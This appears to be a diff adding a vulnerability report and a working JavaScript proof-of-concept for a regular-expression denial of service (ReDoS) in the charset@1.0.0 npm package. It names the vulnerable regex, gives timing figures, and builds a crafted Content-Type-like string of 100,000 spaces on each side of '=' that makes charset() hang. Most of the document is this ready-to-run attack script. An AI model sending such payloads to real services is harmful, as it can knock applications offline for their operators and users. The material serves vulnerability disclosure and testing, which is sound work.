@@ -1,0 +1,33 @@
+Confirmed a ReDoS (polynomial-time catastrophic backtracking) in `charset@1.0.0`'s regex `/(?:charset|encoding)\s*=\s*['"]? *([\w\-]+)/i`, caused by the overlapping `\s*`/`['"]? *` quantifiers both matching whitespace. Timing scales super-linearly (n=5,000 → 13ms, n=40,000 → 771ms, n=100,000 → ~4.8s) confirming the blowup, triggerable via an attacker-controlled `Content-Type` string passed straight to `charset()`.
+
+```javascript
+'use strict';
+
+// PoC: ReDoS in charset@1.0.0
+// The regex /(?:charset|encoding)\s*=\s*['"]? *([\w\-]+)/i
+// has overlapping whitespace-matching quantifiers (\s* and the
+// unbounded literal-space quantifier after the optional quote),
+// causing catastrophic (polynomial) backtracking on crafted input
+// that never satisfies the trailing [\w\-]+ requirement.
+//
+// In real usage this is reachable whenever an attacker controls a
+// value fed into charset(), e.g. a Content-Type header string.
+
+const charset = require('./node_modules/charset');
+
+// Attacker-controlled "Content-Type"-like string: lots of spaces
+// before and after '=', with nothing at the end for [\w\-]+ to match.
+const n = 100000;
+const evilContentType = 'charset' + ' '.repeat(n) + '=' + ' '.repeat(n);
+
+console.log('Payload length:', evilContentType.length);
+console.log('Calling charset() with malicious input... (this will hang)');
+
+const start = Date.now();
+const result = charset(evilContentType);
+const elapsed = Date.now() - start;
+
+console.log('Result:', result);
+console.log('Elapsed time (ms):', elapsed);
+console.log('--> Demonstrates catastrophic/polynomial regex backtracking (ReDoS) in charset@1.0.0');
+```
